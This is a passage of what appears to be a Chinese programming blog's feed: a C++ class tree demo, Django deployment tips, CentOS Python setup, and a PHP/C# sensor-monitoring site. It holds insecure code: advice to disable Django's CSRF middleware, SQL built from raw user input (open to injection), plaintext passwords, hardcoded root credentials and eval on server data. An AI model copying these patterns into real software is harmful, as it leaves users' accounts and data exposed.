i=deletehelper(root,id,job);</span><br><span class="line">    <span class="keyword">if</span>(i==<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;Successfully deleted&quot;</span>&lt;children;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        Person *node=root-&gt;child\[i\];</span><br><span class="line"><span class="keyword">if</span> (node != NULL)</span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;Id is:&quot;</span> &lt;&lt; node-&gt;id &lt;&lt; endl;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;Job is:&quot;</span> &lt;&lt; node-&gt;Job &lt;&lt; endl;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;Name is:&quot;</span> &lt;&lt; node-&gt;Name &lt;&lt; endl;</span><br><span class="line">traversalTree(node);</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">findPerson</span>(<span class="params">Person *root,<span class="built_in">int</span> id,<span class="built_in">string</span> job</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">int</span> i;</span><br><span class="line">    <span class="keyword">if</span>(root-&gt;id==id&amp;&amp;root-&gt;Job==job)</span><br><span class="line">        &#123;</span><br><span class="line">            cout&lt;&lt;<span class="string">&quot;Successfully Find Person whose id is:&quot;</span>&lt;id&lt;&lt;<span class="string">&quot; and Job is:&quot;</span>&lt;Job&lt;&lt;<span class="string">&quot; Name is:&quot;</span>&lt;Name&lt;children;i++)</span><br><span class="line">            &#123;</span><br><span class="line">                Person *node=root-&gt;child\[i\];</span><br><span class="line">                findPerson(node,id,job);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title">Teacher</span>:<span class="title">public</span> <span class="title">Person</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        <span class="function"><span class="keyword">void</span> <span class="title">setjob</span>(<span class="params"></span>)</span>;</span><br><span class="line">        Teacher(<span class="built_in">int</span> id,<span class="built_in">string</span> name);</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line">Teacher::Teacher(int id,string name):Person(id,name)</span><br><span class="line">&#123;</span><br><span class="line">    setjob();</span><br><span class="line">&#125;</span><br><span class="line">void Teacher::setjob()</span><br><span class="line">&#123;</span><br><span class="line">    Job=<span class="string">&quot;Teacher&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title">Student</span>:<span class="title">public</span> <span class="title">Person</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        Student(<span class="built_in">int</span> id,<span class="built_in">string</span> name);</span><br><span class="line">        <span class="function"><span class="keyword">void</span> <span class="title">setjob</span>(<span class="params"></span>)</span>;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line">Student::Student(int id,string name):Person(id,name)</span><br><span class="line">&#123;</span><br><span class="line">    setjob();</span><br><span class="line">&#125;</span><br><span class="line">void Student::setjob()</span><br><span class="line">&#123;</span><br><span class="line">    Job=<span class="string">&quot;Student&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="built_in">int</span> <span class="title">main</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//printf(&quot;Hello World!/n&quot;);</span></span><br><span class="line">    Person* root=<span class="keyword">new</span> Person(<span class="number">1</span>,<span class="string">&quot;Zhangsan&quot;</span>);</span><br><span class="line">    Person* root_child1=<span class="keyword">new</span> Person(<span class="number">2</span>,<span class="string">&quot;Lisi&quot;</span>);</span><br><span class="line">    Person* root_child2=<span class="keyword">new</span> Teacher(<span class="number">3</span>,<span class="string">&quot;Wangwu&quot;</span>);</span><br><span class="line">    Person* root\_child1\_child1=<span class="keyword">new</span> Teacher(<span class="number">4</span>,<span class="string">&quot;Zhaoyi&quot;</span>);</span><br><span class="line">    Person* root\_child1\_child2=<span class="keyword">new</span> Student(<span class="number">5</span>,<span class="string">&quot;Qianer&quot;</span>);</span><br><span class="line">    Person* root\_child2\_child1=<span class="keyword">new</span> Student(<span class="number">6</span>,<span class="string">&quot;Sunliu&quot;</span>);</span><br><span class="line">    Person* root\_child2\_child2=<span class="keyword">new</span> Teacher(<span class="number">7</span>,<span class="string">&quot;Zhouqi&quot;</span>);</span><br><span class="line">    root-&gt;addChild(root_child1);</span><br><span class="line">    root-&gt;addChild(root_child2);</span><br><span class="line">    root\_child1-&gt;addChild(root\_child1_child1);</span><br><span class="line">    root\_child1-&gt;addChild(root\_child1_child2);</span><br><span class="line">    root\_child2-&gt;addChild(root\_child2_child1);</span><br><span class="line">    root\_child2-&gt;addChild(root\_child2_child2);</span><br><span class="line">    findPerson(root,<span class="number">3</span>,<span class="string">&quot;Teacher&quot;</span>);</span><br><span class="line">    findPerson(root,<span class="number">6</span>,<span class="string">&quot;Student&quot;</span>);</span><br><span class="line">    traversalTree(root);</span><br><span class="line">    deletePerson(root,<span class="number">7</span>,<span class="string">&quot;Teacher&quot;</span>);</span><br><span class="line">    traversalTree(root);</span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;  设计了基类是Person，派生类是Teacher，Student的三个类，并构造一棵树，代码还有点问题在删除节点的时候，删除节点之后子节点如何并到上层节点，当时时间比较紧迫没有细弄就直接全部删除了。&lt;/p&gt;
&lt;figure class=&quot;highlight cs&quot;&gt;&lt;t</summary>
      
    
    
    
    <category term="C++" scheme="https://coder.lufer.cc/categories/C/"/>
    
    
    <category term="C++" scheme="https://coder.lufer.cc/tags/C/"/>
    
  </entry>
  
  <entry>
    <title>Django在服务器部署的几大坑</title>
    <link href="https://coder.lufer.cc/%E5%90%8E%E7%AB%AF/Django%E5%9C%A8%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%83%A8%E7%BD%B2%E7%9A%84%E5%87%A0%E5%A4%A7%E5%9D%91/"/>
    <id>https://coder.lufer.cc/%E5%90%8E%E7%AB%AF/Django%E5%9C%A8%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%83%A8%E7%BD%B2%E7%9A%84%E5%87%A0%E5%A4%A7%E5%9D%91/</id>
    <published>2017-12-27T16:56:56.000Z</published>
    <updated>2021-04-06T02:18:06.581Z</updated>
    
    <content type="html"><![CDATA[<ol><li>静态资源获取</li></ol><p>  在manage.py里面startapp或者createapp创建的应用，在应用目录下创建/static/可能并不会被自动收集，要确保setting.py中的INSTALL APPS里面有你的APP</p><ol start="2"><li>域名访问限制</li></ol><p>  在settings.py中修改ALLOWED_HOSTS = [“服务器IP”,“localhost”,“127.0.0.1”]，否则会无法访问</p><ol start="3"><li>跨域请求伪造</li></ol><p>  Django为了防止跨域请求伪造，会对表单请求进行验证，可能会导致请求无法正确响应，在MIDDLEWARE里面把’django.middleware.csrf.CsrfViewMiddleware’注释掉即可</p>]]></content>
    
    
      
      
    <summary type="html">&lt;ol&gt;
&lt;li&gt;静态资源获取&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;  在manage.py里面startapp或者createapp创建的应用，在应用目录下创建/static/可能并不会被自动收集，要确保setting.py中的INSTALL APPS里面有你的APP&lt;/p&gt;
&lt;ol </summary>
      
    
    
    
    <category term="Python" scheme="https://coder.lufer.cc/categories/Python/"/>
    
    
    <category term="后端" scheme="https://coder.lufer.cc/tags/%E5%90%8E%E7%AB%AF/"/>
    
    <category term="Python" scheme="https://coder.lufer.cc/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>CentOS保留Python2.6安装Python2.7并安装Pip</title>
    <link href="https://coder.lufer.cc/Linux/CentOS%20%E4%BF%9D%E7%95%99Python2.6%E5%AE%89%E8%A3%85Python2.7%E5%B9%B6%E5%AE%89%E8%A3%85Pip/"/>
    <id>https://coder.lufer.cc/Linux/CentOS%20%E4%BF%9D%E7%95%99Python2.6%E5%AE%89%E8%A3%85Python2.7%E5%B9%B6%E5%AE%89%E8%A3%85Pip/</id>
    <published>2017-12-27T16:50:23.000Z</published>
    <updated>2021-04-06T02:17:55.985Z</updated>
    
    <content type="html"><![CDATA[<p>  在保留系统Python2.6的情况下安装2.7，并为2.7的python安装pip。</p><h2 id="1-下载python-274tgz"><a class="markdownIt-Anchor" href="#1-下载python-274tgz"></a> 1. 下载Python-2.7.4.tgz</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wget http:&#x2F;&#x2F;python.org&#x2F;ftp&#x2F;python&#x2F;2.7.4&#x2F;Python-2.7.4.tgz</span><br></pre></td></tr></table></figure><h2 id="2-解压安装"><a class="markdownIt-Anchor" href="#2-解压安装"></a> 2. 解压安装</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tar -xvf Python-2.7.4.tgz</span><br><span class="line">cd Python-2.7.4</span><br><span class="line">.&#x2F;configure --prefix&#x3D;&#x2F;usr&#x2F;local&#x2F;python2.7</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure><h2 id="3-创建软链接来用python27调用python27"><a class="markdownIt-Anchor" href="#3-创建软链接来用python27调用python27"></a> 3. 创建软链接来用python27调用python2.7</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ln -s &#x2F;usr&#x2F;local&#x2F;python2.7&#x2F;bin&#x2F;python2.7 &#x2F;usr&#x2F;bin&#x2F;python27</span><br></pre></td></tr></table></figure><h2 id="4-下载pip"><a class="markdownIt-Anchor" href="#4-下载pip"></a> 4. 下载pip</h2><p>  地址 <a href="https://bootstrap.pypa.io/get-pip.py">https://bootstrap.pypa.io/get-pip.py</a></p><h2 id="5-执行安装命令"><a class="markdownIt-Anchor" href="#5-执行安装命令"></a> 5. 执行安装命令</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python27 get-pip.py</span><br></pre></td></tr></table></figure><h2 id="6-创建软连接"><a class="markdownIt-Anchor" href="#6-创建软连接"></a> 6. 创建软连接</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ln -s &#x2F;usr&#x2F;local&#x2F;python2.7&#x2F;bin&#x2F;pip &#x2F;usr&#x2F;bin&#x2F;pip27</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;  在保留系统Python2.6的情况下安装2.7，并为2.7的python安装pip。&lt;/p&gt;
&lt;h2 id=&quot;1-下载python-274tgz&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#1-下载python-274tgz&quot;&gt;&lt;/a&gt; 1</summary>
      
    
    
    
    <category term="Python" scheme="https://coder.lufer.cc/categories/Python/"/>
    
    
    <category term="Python" scheme="https://coder.lufer.cc/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>传感器，视频监控与展示网站的简易解决方案</title>
    <link href="https://coder.lufer.cc/CSharp/%E4%BC%A0%E6%84%9F%E5%99%A8%EF%BC%8C%E8%A7%86%E9%A2%91%E7%9B%91%E6%8E%A7%E4%B8%8E%E5%B1%95%E7%A4%BA%E7%BD%91%E7%AB%99%E7%9A%84%E7%AE%80%E6%98%93%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/"/>
    <id>https://coder.lufer.cc/CSharp/%E4%BC%A0%E6%84%9F%E5%99%A8%EF%BC%8C%E8%A7%86%E9%A2%91%E7%9B%91%E6%8E%A7%E4%B8%8E%E5%B1%95%E7%A4%BA%E7%BD%91%E7%AB%99%E7%9A%84%E7%AE%80%E6%98%93%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/</id>
    <published>2017-06-14T17:38:09.000Z</published>
    <updated>2021-12-17T03:59:35.915Z</updated>
    
    <content type="html"><![CDATA[<p>  其实这个项目已经完成一段时间了，今天才想起来记录一下。 网站部分基于PHP，客户端用C#。 先贴效果图。</p><p><img src="https://pic.lufer.cc/images/2021/03/15/e4xVGn.jpg" alt="" /></p><p><img src="https://pic.lufer.cc/images/2021/03/15/e4xZ2q.jpg" alt="" /></p><p><img src="https://pic.lufer.cc/images/2021/03/15/e4xk5j.jpg" alt="" /></p><p><img src="https://pic.lufer.cc/images/2021/03/15/e4xFaQ.jpg" alt="" /></p><p><img src="https://pic.lufer.cc/images/2021/03/15/e4xiVg.jpg" alt="" /></p><p>  登录注册验证</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$conn</span> = mysql_connect(<span class="string">&quot;localhost&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;123456&quot;</span>);</span><br><span class="line">mysql_select_db(<span class="string">&quot;design&quot;</span>, <span class="variable">$conn</span>);</span><br><span class="line">mysql_query(<span class="string">&quot;SET NAMES &#x27;UTF8&#x27;&quot;</span>,<span class="variable">$conn</span>);</span><br><span class="line"><span class="comment">//以用户名为条件，构建数据库查询语句</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select * from user where username=&#x27;<span class="subst">$name</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="variable">$Result</span> = mysql_query(<span class="variable">$sql</span>, <span class="variable">$conn</span>);</span><br><span class="line"><span class="comment">//如果查到了记录，说明这个用户名已经注册了，进行提示，然后跳转回注册页</span></span><br><span class="line"><span class="keyword">if</span>(mysql_num_rows(<span class="variable">$Result</span>)&gt;<span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span><span class="string">&quot;alert(&#x27;注册失败，用户名已存在&#x27;);location=&#x27;../regist.php&#x27;;&quot;</span>;</span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//在表user中插入一条记录，将用户名和密码保存进去</span></span><br><span class="line">    <span class="variable">$sql2</span> = <span class="string">&quot;insert into user(username,password) value(&#x27;<span class="subst">$name</span>&#x27;,&#x27;<span class="subst">$password</span>&#x27;)&quot;</span>;</span><br><span class="line">    <span class="comment">//如果插入语句执行成功，则将用户名写入session，然后进行提示，跳转到后台页面</span></span><br><span class="line">    <span class="keyword">if</span> (  mysql_query(<span class="variable">$sql2</span>, <span class="variable">$conn</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>]=<span class="variable">$name</span>;</span><br><span class="line">        <span class="keyword">echo</span><span class="string">&quot;alert(&#x27;注册成功&#x27;);location=&#x27;../temp-manager.php&#x27;;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$conn</span> = mysql_connect(<span class="string">&quot;localhost&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;123456&quot;</span>);</span><br><span class="line"><span class="comment">//选择数据库design</span></span><br><span class="line">mysql_select_db(<span class="string">&quot;design&quot;</span>, <span class="variable">$conn</span>);</span><br><span class="line"><span class="comment">//设置编码方式为UTF8</span></span><br><span class="line">mysql_query(<span class="string">&quot;SET NAMES &#x27;UTF8&#x27;&quot;</span>,<span class="variable">$conn</span>);</span><br><span class="line"><span class="comment">//编写查询语句，以用户名和密码作为条件在数据库中进行查询</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select * from user where username=&#x27;<span class="subst">$name</span>&#x27; and password=&#x27;<span class="subst">$password</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="comment">//获取查询结果</span></span><br><span class="line"><span class="variable">$Result</span> = mysql_query(<span class="variable">$sql</span>, <span class="variable">$conn</span>);</span><br><span class="line"><span class="comment">//在结果中取出第一行</span></span><br><span class="line"><span class="variable">$onerow</span> = mysql_fetch_array(<span class="variable">$Result</span>);</span><br><span class="line"><span class="comment">//如果存在这么一行，说明查到了结果，用户名和密码匹配</span></span><br><span class="line"><span class="keyword">if</span> (  <span class="variable">$onerow</span> )</span><br><span class="line">&#123;</span><br><span class="line">   <span class="comment">//session中存入用户名，然后跳转到后台页面</span></span><br><span class="line">   <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>]=<span class="variable">$onerow</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">   <span class="keyword">echo</span><span class="string">&quot;location=&#x27;../temp-manager.php&#x27;;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//没有查询到记录，说明用户名或者密码错误，进行提示然后跳转回登录页</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">   <span class="keyword">echo</span><span class="string">&quot;alert(&#x27;密码错误&#x27;);location=&#x27;../index.php&#x27;;&quot;</span>;</span><br></pre></td></tr></table></figure><p>  用户登录状态保存</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//登录时</span></span><br><span class="line"><span class="comment">//生成一个session，用户保存用户的登录状态</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="comment">//session中存入用户名</span></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>]=<span class="variable">$onerow</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="comment">//注销时</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="comment">//使用一个会话变量检查登录状态</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">//要清除会话变量，将$_SESSION超级全局变量设置为一个空数组</span></span><br><span class="line">  <span class="variable">$_SESSION</span> = <span class="keyword">array</span>();</span><br><span class="line">  <span class="comment">//如果存在一个会话cookie，通过将到期时间设置为之前1个小时从而将其删除</span></span><br><span class="line">  <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[session_name()]))&#123;</span><br><span class="line">    setcookie(session_name(),<span class="string">&#x27;&#x27;</span>,time()<span class="number">-3600</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//使用内置session_destroy()函数调用撤销会话</span></span><br><span class="line">  session_destroy();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>  客户端登录验证与发包</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">string</span> username = textBox1.Text;                <span class="comment">//将用户名文本框中的值保存到字符串变量username中</span></span><br><span class="line"><span class="keyword">string</span> password = textBox2.Text;                <span class="comment">//将密码文本框中的值保存到password</span></span><br><span class="line"><span class="keyword">string</span> result = <span class="string">&quot;&quot;</span>;                             <span class="comment">//初始化result变量，赋空值</span></span><br><span class="line"><span class="keyword">string</span> url = <span class="string">&quot;http://127.0.0.1//helper//clientlogin.php&quot;</span>;          <span class="comment">//将通信的目标连接地址保存到url中</span></span><br><span class="line">HttpWebRequest req = (HttpWebRequest)WebRequest.Create(url);       <span class="comment">//调用系统Http请求库，初始化对象</span></span><br><span class="line">req.Method = <span class="string">&quot;POST&quot;</span>;                                               <span class="comment">//设定请求方式为“POST”</span></span><br><span class="line">req.ContentType = <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>;             <span class="comment">//设定文本编码方式   不用了解这个的意义 </span></span><br><span class="line">StringBuilder builder = <span class="keyword">new</span> StringBuilder();                       <span class="comment">//构造请求的参数字符串</span></span><br><span class="line">builder.AppendFormat(<span class="string">&quot;name=&quot;</span> + username);                          <span class="comment">//添加name参数</span></span><br><span class="line">builder.AppendFormat(<span class="string">&quot;&amp;password=&quot;</span> + password);                     <span class="comment">//添加password参数</span></span><br><span class="line">byte[] data = Encoding.UTF8.GetBytes(builder.ToString());          <span class="comment">//将字符串构造成字节流</span></span><br><span class="line">req.ContentLength = data.Length;</span><br><span class="line"><span class="keyword">try</span></span><br><span class="line">&#123;</span><br><span class="line">     using (Stream reqStream = req.GetRequestStream())</span><br><span class="line">     &#123;</span><br><span class="line">          reqStream.Write(data, <span class="number">0</span>, data.Length);</span><br><span class="line">          reqStream.Close();</span><br><span class="line">     &#125;</span><br><span class="line">     HttpWebResponse resp = (HttpWebResponse)req.GetResponse();      <span class="comment">//进行通信，获取返回值</span></span><br><span class="line">     Stream stream = resp.GetResponseStream();</span><br><span class="line">     <span class="comment">//获取响应内容  </span></span><br><span class="line">     using (StreamReader reader = <span class="keyword">new</span> StreamReader(stream, Encoding.UTF8))</span><br><span class="line">     &#123;</span><br><span class="line">          result = reader.ReadToEnd();                                <span class="comment">//把返回值保存到result中</span></span><br><span class="line">          <span class="keyword">return</span> result;                                              <span class="comment">//返回result</span></span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span> (<span class="built_in">Exception</span> e)</span><br><span class="line">&#123;</span><br><span class="line">     <span class="keyword">return</span> e.Message;                                               <span class="comment">//如果过程中出现异常，返回异常信息</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>  UNIX时间戳转换</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//Highchart默认使用UNIX时间戳，为了便于后面的显示进行转换</span></span><br><span class="line"><span class="comment">//获取时间</span></span><br><span class="line">DateTime startTime = TimeZone.CurrentTimeZone.ToLocalTime(<span class="keyword">new</span> System.DateTime(<span class="number">1970</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>));</span><br><span class="line">DateTime nowTime = DateTime.Now;</span><br><span class="line"><span class="comment">//转换为UNIX时间戳</span></span><br><span class="line">long unixTime = (long)Math.Round((nowTime - startTime).TotalMilliseconds, MidpointRounding.AwayFromZero);</span><br></pre></td></tr></table></figure><p>  HighChart动态表格的实现</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"> tempdata=<span class="keyword">new</span> <span class="built_in">Array</span>();</span><br><span class="line">$.get(<span class="string">&quot;helper/firsthumi.php&quot;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">data</span>)</span>&#123;</span><br><span class="line"><span class="keyword">var</span> jsonObj = <span class="built_in">eval</span>(<span class="string">&#x27;(&#x27;</span> + data + <span class="string">&#x27;)&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//var list=data.dataList;</span></span><br><span class="line"><span class="comment">//console.log(list);</span></span><br><span class="line"><span class="keyword">var</span> time,temp;</span><br><span class="line">$.each(jsonObj.dataList, <span class="function"><span class="keyword">function</span>(<span class="params">i,item</span>)</span>&#123;</span><br><span class="line">time=<span class="built_in">parseInt</span>(item.time);</span><br><span class="line">humi=<span class="built_in">parseFloat</span>(item.humi);</span><br><span class="line">humidata.push(&#123;</span><br><span class="line">x: time,</span><br><span class="line">y: humi</span><br><span class="line">&#125;);</span><br><span class="line">&#125;);</span><br><span class="line">$(<span class="string">&#x27;#container2&#x27;</span>).highcharts(&#123;</span><br><span class="line">chart: &#123;</span><br><span class="line">type: <span class="string">&#x27;spline&#x27;</span>,</span><br><span class="line">animation: Highcharts.svg, <span class="comment">// don&#x27;t animate in old IE</span></span><br><span class="line">marginRight: <span class="number">10</span>,</span><br><span class="line">events: &#123;</span><br><span class="line">load: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">// set up the updating of the chart each second</span></span><br><span class="line"><span class="keyword">var</span> series = <span class="built_in">this</span>.series[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line"><span class="built_in">setInterval</span>(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">var</span> jsonobj=$.ajax(&#123;</span><br><span class="line">url:<span class="string">&quot;helper/loadhumi.php&quot;</span>,</span><br><span class="line"><span class="keyword">async</span>:<span class="literal">false</span>,</span><br><span class="line"></span><br><span class="line">&#125;);</span><br><span class="line"><span class="keyword">var</span> x,y;</span><br><span class="line"><span class="keyword">var</span> jjj=<span class="built_in">eval</span>(<span class="string">&#x27;(&#x27;</span> + jsonobj.responseText + <span class="string">&#x27;)&#x27;</span>);</span><br><span class="line"></span><br><span class="line">x=<span class="built_in">parseInt</span>(jjj.dataList[<span class="number">0</span>].time);</span><br><span class="line">y=<span class="built_in">parseFloat</span>(jjj.dataList[<span class="number">0</span>].humi);</span><br><span class="line"><span class="keyword">var</span> divhumi = $(<span class="string">&quot;#curhumi&quot;</span>);</span><br><span class="line">divhumi.text(<span class="string">&quot;&quot;</span>);<span class="comment">// 清空数据</span></span><br><span class="line">    divhumi.append(<span class="string">&quot;当前湿度为:&quot;</span>+y+<span class="string">&quot;%&quot;</span>);</span><br><span class="line">series.addPoint([x, y], <span class="literal">true</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;, <span class="number">1000</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">,</span><br><span class="line">title: &#123;</span><br><span class="line">text: <span class="string">&#x27;湿度走势图--1秒&#x27;</span></span><br><span class="line">&#125;,</span><br><span class="line">xAxis: &#123;</span><br><span class="line">type: <span class="string">&#x27;datetime&#x27;</span>,</span><br><span class="line">tickPixelInterval: <span class="number">100</span></span><br><span class="line">&#125;,</span><br><span class="line">yAxis: &#123;</span><br><span class="line">title: &#123;</span><br><span class="line">text: <span class="string">&#x27;湿度/%&#x27;</span></span><br><span class="line">&#125;,</span><br><span class="line">plotLines: [&#123;</span><br><span class="line">value: <span class="number">0</span>,</span><br><span class="line">width: <span class="number">1</span>,</span><br><span class="line">color: <span class="string">&#x27;#808080&#x27;</span></span><br><span class="line">&#125;]</span><br><span class="line">&#125;,</span><br><span class="line">tooltip: &#123;</span><br><span class="line">formatter: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">&#x27;&lt;b&gt;&#x27;</span>+ <span class="built_in">this</span>.series.name +<span class="string">&#x27;&lt;/b&gt;&lt;br/&gt;&#x27;</span>+</span><br><span class="line">Highcharts.dateFormat(<span class="string">&#x27;%Y-%m-%d %H:%M:%S&#x27;</span>, <span class="built_in">this</span>.x) +<span class="string">&#x27;&lt;br/&gt;&#x27;</span>+</span><br><span class="line">Highcharts.numberFormat(<span class="built_in">this</span>.y, <span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;,</span><br><span class="line">legend: &#123;</span><br><span class="line">enabled: <span class="literal">false</span></span><br><span class="line">&#125;,</span><br><span class="line">exporting: &#123;</span><br><span class="line">enabled: <span class="literal">false</span></span><br><span class="line">&#125;,</span><br><span class="line">series: [&#123;</span><br><span class="line">name: <span class="string">&#x27;湿度数据&#x27;</span>,</span><br><span class="line">data: humidata</span><br><span class="line">&#125;]</span><br><span class="line">&#125;);</span><br><span class="line">&#125;); </span><br></pre></td></tr></table></figure><p>  EasyUi动态表格的实现</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//获取数据</span></span><br><span class="line"> $(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">             <span class="comment">//动态加载标题和数据</span></span><br><span class="line">             $.ajax(&#123;</span><br><span class="line">                 url: <span class="string">&quot;helper/getprofile.php&quot;</span>,</span><br><span class="line">                 type: <span class="string">&quot;get&quot;</span>,</span><br><span class="line">                 dataType: <span class="string">&quot;json&quot;</span>,</span><br><span class="line">                 success: <span class="function"><span class="keyword">function</span> (<span class="params">data</span>) </span>&#123;</span><br><span class="line">  <span class="comment">//将取回的数据加载到datagrid中</span></span><br><span class="line">                    $(<span class="string">&quot;#dg&quot;</span>).datagrid(<span class="string">&quot;loadData&quot;</span>, data.dataList);</span><br><span class="line">                 &#125;</span><br><span class="line">             &#125;);</span><br><span class="line">        &#125;); </span><br><span class="line"><span class="comment">//删除行</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">removeit</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">      <span class="keyword">if</span> (editIndex == <span class="literal">undefined</span>)&#123;<span class="keyword">return</span>&#125;</span><br><span class="line">      <span class="comment">//获取当前选中的行</span></span><br><span class="line">      <span class="keyword">var</span> row = $(<span class="string">&#x27;#dg&#x27;</span>).datagrid(<span class="string">&#x27;getSelections&#x27;</span>);</span><br><span class="line">      <span class="comment">//获取该行任命</span></span><br><span class="line">      <span class="keyword">var</span> name=row[<span class="number">0</span>].name;</span><br><span class="line">      <span class="comment">//进行提示，如果用户点击确认触发ajax请求</span></span><br><span class="line">      <span class="keyword">if</span>(<span class="built_in">window</span>.confirm(<span class="string">&#x27;你确定要删除联系人&#x27;</span>+name+<span class="string">&#x27;吗？&#x27;</span>))</span><br><span class="line">      &#123;</span><br><span class="line">      <span class="comment">//发送请求，参数为该行数据</span></span><br><span class="line">      $.ajax(&#123;</span><br><span class="line">              url : <span class="string">&#x27;helper/profiledelete.php&#x27;</span>,</span><br><span class="line">              data : row[<span class="number">0</span>],</span><br><span class="line">              dataType : <span class="string">&#x27;json&#x27;</span>,</span><br><span class="line">              success : <span class="function"><span class="keyword">function</span>(<span class="params">r</span>) </span>&#123;</span><br><span class="line">                  <span class="keyword">if</span> (r.success) &#123;</span><br><span class="line">      <span class="comment">//成功后进行提示</span></span><br><span class="line">      alert(<span class="string">&quot;删除成功！&quot;</span>);</span><br><span class="line">      <span class="comment">//在表格中删除该行</span></span><br><span class="line">                      $(<span class="string">&#x27;#dg&#x27;</span>).datagrid(<span class="string">&#x27;cancelEdit&#x27;</span>, editIndex)</span><br><span class="line">                         .datagrid(<span class="string">&#x27;deleteRow&#x27;</span>, editIndex);</span><br><span class="line">                